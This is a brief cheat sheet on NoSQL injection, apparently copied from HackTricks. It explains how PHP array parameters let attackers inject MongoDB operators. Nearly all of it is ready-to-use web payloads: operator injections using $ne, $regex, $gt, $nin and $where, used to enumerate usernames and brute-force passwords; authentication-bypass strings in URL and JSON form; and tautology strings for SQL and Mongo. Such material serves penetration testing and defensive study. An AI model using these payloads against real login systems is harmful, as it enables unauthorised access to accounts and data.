# NoSQL Injection

* Origional Author: [https://book.hacktricks.xyz/pentesting-web/nosql-injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)

In PHP you can send an Array changing the sent parameter from _parameter=foo_ to _parameter\[arrName]=foo._

The exploits are based in adding an **Operator**:

```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```

### Basic authentication bypass

**Using not equal ($ne) or greater ($gt)**

```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

### **SQL - Mongo**

```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00
```
